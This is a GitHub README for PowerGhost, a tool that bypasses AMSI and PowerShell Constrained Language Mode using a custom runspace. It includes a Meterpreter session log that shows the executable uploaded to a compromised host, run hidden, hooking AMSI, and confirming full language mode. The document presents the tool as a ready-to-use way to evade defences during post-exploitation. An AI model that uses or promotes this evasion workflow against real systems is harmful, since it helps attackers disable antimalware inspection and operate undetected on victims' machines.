# PowerGhost
A custom run space to bypass AMSI and Constrained Language mode in PowerShell.

<img src="https://github.com/plackyhacker/PowerGhost/blob/main/pg_demo.gif?raw=true" alt="Demo "/>

## Example running in Meterpreter

```
meterpreter > upload PowerGhost64.exe
[*] uploading  : PowerGhost64.exe -> PowerGhost64.exe
[*] Uploaded 6.00 KiB of 6.00 KiB (100.0%): PowerGhost64.exe -> PowerGhost64.exe
[*] uploaded   : PowerGhost64.exe -> PowerGhost64.exe
meterpreter > execute -H -i -f "PowerGhost64.exe"
Process 5276 created.
Channel 8 created.

PowerGhost by PlackyHacker
--------------------------

Type 'exit' to close.

[+] Hooking AMSI for bypass...
PG C:\Users\Placky> $ExecutionContext.SessionState.LanguageMode
FullLanguage
PG C:\Users\Placky>
```
